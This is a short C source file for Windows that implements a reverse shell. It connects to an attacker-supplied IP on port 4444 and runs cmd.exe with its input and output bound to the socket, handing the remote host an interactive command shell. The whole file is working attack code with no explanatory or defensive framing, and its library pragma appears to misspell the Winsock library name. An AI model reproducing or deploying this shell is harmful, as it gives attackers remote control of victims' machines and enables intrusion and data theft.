#include "helpers.h"
#include <winsock2.h>
#pragma comment(lib, "w2_32")

int main (int argc, char* argv[]) {
    if (argc < 2) {
        log_cstyle("[!] Not enough arguments. Check input.");
        return -1;
    }

    WSADATA socketData;
    SOCKET mainSocket;
    struct sockaddr_in connectionAddress;
    STARTUPINFO startupInfo;
    PROCESS_INFORMATION processInfo;
    char* attackerIp = argv[1];
    short attackerPort = 4444;
    WSAStartup(MAKEWORD(2, 2), &socketData);
    mainSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    connectionAddress.sin_family = AF_INET;
    connectionAddress.sin_port = htons(attackerPort);
    connectionAddress.sin_addr.s_addr = inet_addr(attackerIp);

    WSAConnect(mainSocket, (SOCKADDR*)&connectionAddress,
    sizeof(connectionAddress), NULL, NULL, NULL, NULL);

    memset(&startupInfo, 0, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = STARTF_USESTDHANDLES;
    startupInfo.hStdInput = startupInfo.hStdOutput =
    startupInfo.hStdError = (HANDLE) mainSocket;
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL,
    NULL, &startupInfo, &processInfo);

    return 0;
}
